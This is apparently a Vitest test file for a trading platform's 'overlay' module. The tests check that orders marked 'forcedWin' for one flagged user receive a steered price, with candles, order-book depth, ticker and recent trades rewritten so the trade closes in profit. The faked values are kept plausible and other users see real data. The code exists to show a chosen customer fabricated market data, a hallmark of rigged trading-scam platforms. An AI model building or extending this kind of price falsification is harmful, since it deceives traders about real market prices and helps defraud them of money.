import { ObjectId } from "mongodb";
import { beforeEach, describe, expect, it } from "vitest";
import { collections } from "@/lib/mongo";
import { activeWindow, forcedClosePrice, invalidateOverlay, steeredPrice, transformCandles, transformDepth, transformTicker, transformRecentTrades } from "./overlay";

const SECOND = 1000;
const MINUTE = 60 * SECOND;

const clearAll = async () => {
  for (const collection of Object.values(collections)) await collection().deleteMany({});
};

beforeEach(async () => {
  await clearAll();
  invalidateOverlay("overlay-user");
});

const hexId = (seed) => seed.repeat(12);

const insertForcedOrder = async ({ direction = "call", openPrice = 65000, openedAtOffset = -20 * SECOND, duration = 30 } = {}) => {
  const openedAt = new Date(Math.floor(Date.now() / SECOND) * SECOND + openedAtOffset);
  const orderId = new ObjectId();
  await collections.orders().insertOne({
    _id: orderId,
    userId: "overlay-user",
    symbol: "BTCUSDT",
    direction,
    duration,
    amount: 100,
    payoutRate: 0.8,
    openPrice,
    openedAt,
    expiresAt: new Date(openedAt.getTime() + duration * SECOND),
    forcedWin: true,
    status: "open",
  });
  return { orderId, openedAt, expiresAt: new Date(openedAt.getTime() + duration * SECOND) };
};

describe("Steered price path", () => {
  it("keeps a forced call above its open price and ends above it at expiry", async () => {
    const { orderId, openedAt, expiresAt } = await insertForcedOrder({ direction: "call" });
    const order = await collections.orders().findOne({ _id: orderId });
    const close = await forcedClosePrice(order);
    expect(close).toBeGreaterThan(order.openPrice);
    expect(close).toBeLessThan(order.openPrice * 1.01);
    const early = await steeredPrice("overlay-user", "BTCUSDT", openedAt.getTime() + 1000);
    const late = await steeredPrice("overlay-user", "BTCUSDT", expiresAt.getTime() - 1000);
    expect(early).toBeGreaterThan(order.openPrice * 0.999);
    expect(late).toBeGreaterThan(early);
  });

  it("keeps a forced put below its open price at expiry", async () => {
    const { orderId } = await insertForcedOrder({ direction: "put" });
    const order = await collections.orders().findOne({ _id: orderId });
    const close = await forcedClosePrice(order);
    expect(close).toBeLessThan(order.openPrice);
  });

  it("returns no steering for users without forced trades", async () => {
    await insertForcedOrder();
    expect(await steeredPrice("someone-else", "BTCUSDT")).toBeNull();
    expect(await steeredPrice("overlay-user", "ETHUSDT")).toBeNull();
  });

  it("stops steering after the order expires", async () => {
    const { expiresAt } = await insertForcedOrder({ duration: 5, openedAtOffset: -10 * SECOND });
    expect(await steeredPrice("overlay-user", "BTCUSDT", expiresAt.getTime() + 5 * SECOND)).toBeNull();
  });
});

describe("Candle transform", () => {
  it("replaces candles inside the window and keeps earlier candles real", async () => {
    const { openedAt, expiresAt } = await insertForcedOrder({ direction: "call", openedAtOffset: -30 * SECOND, duration: 60 });
    const step = 5 * SECOND;
    const candles = [0, 1, 2, 3, 4, 5, 6].map((index) => ({
      openTime: openedAt.getTime() - 2 * step + index * step,
      open: 65000,
      high: 65100,
      low: 64900,
      close: 65000,
    }));
    const steered = await transformCandles("overlay-user", "BTCUSDT", candles, step);
    expect(steered[0]).toEqual(candles[0]);
    expect(steered[1]).toEqual(candles[1]);
    const last = steered.at(-1);
    expect(last.close).toBeGreaterThan(65000);
    expect(last.high).toBeGreaterThanOrEqual(last.close);
    expect(last.low).toBeLessThanOrEqual(last.open);
    expect(expiresAt.getTime()).toBeGreaterThan(openedAt.getTime());
  });

  it("leaves candles untouched when there is no window", async () => {
    const candles = [{ openTime: Date.now() - SECOND, open: 1, high: 2, low: 0.5, close: 1.5 }];
    expect(await transformCandles("overlay-user", "BTCUSDT", candles, SECOND)).toEqual(candles);
  });
});

describe("Depth, ticker and trade transforms", () => {
  it("shifts depth levels toward the steered price", async () => {
    await insertForcedOrder({ direction: "call", openPrice: 65000 });
    const book = { bids: [["64990", "1"]], asks: [["65010", "1"]] };
    const shifted = await transformDepth("overlay-user", "BTCUSDT", book);
    expect(Number(shifted.asks[0][0])).toBeGreaterThan(65010);
    expect(Number(shifted.bids[0][0])).toBeGreaterThan(64990);
  });

  it("rewrites the last price of a ticker while keeping it plausible", async () => {
    await insertForcedOrder({ direction: "call", openPrice: 65000 });
    const ticker = { symbol: "BTCUSDT", price: 65005, open: 64800, high: 65100, low: 64700, volume: 1, quoteVolume: 1, changePercent: 0.3 };
    const steered = await transformTicker("overlay-user", ticker);
    expect(steered.price).toBeGreaterThan(65000);
    expect(steered.high).toBeGreaterThanOrEqual(steered.price);
    expect(steered.low).toBeLessThanOrEqual(steered.price);
  });

  it("rewrites trade prices inside the window only", async () => {
    const { openedAt } = await insertForcedOrder({ direction: "call", openPrice: 65000 });
    const trades = [
      { id: 1, price: 65010, quantity: 1, time: openedAt.getTime() + 25 * SECOND, sell: false },
      { id: 2, price: 65010, quantity: 1, time: openedAt.getTime() - 5 * SECOND, sell: false },
    ];
    const steered = await transformRecentTrades("overlay-user", "BTCUSDT", trades);
    expect(steered[0].price).toBeGreaterThan(65000);
    expect(steered[1].price).toBe(65010);
  });
});

describe("Overlay user scoping", () => {
  it("only steers for the flagged trade owner", async () => {
    await insertForcedOrder({ direction: "call", openPrice: 65000 });
    const mine = await activeWindow("overlay-user", "BTCUSDT");
    const other = await activeWindow(hexId("aa"), "BTCUSDT");
    expect(mine).not.toBeNull();
    expect(other).toBeNull();
  });
});
